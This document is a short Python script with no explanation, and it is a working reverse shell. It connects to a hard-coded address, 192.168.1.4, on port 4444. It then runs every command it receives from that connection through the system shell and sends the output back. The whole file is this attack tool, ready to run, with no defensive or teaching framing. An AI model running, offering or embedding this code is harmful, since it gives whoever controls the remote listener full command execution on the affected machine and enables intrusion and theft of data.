import socket
import subprocess

HOST = "192.168.1.4"
PORT = 4444

s = socket.socket()
s.connect((HOST, PORT))

while True:
    command = s.recv(4096).decode().strip()

    if command in ("exit", "quit"):
        break

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True
    )

    s.sendall((result.stdout + result.stderr).encode())

s.close()
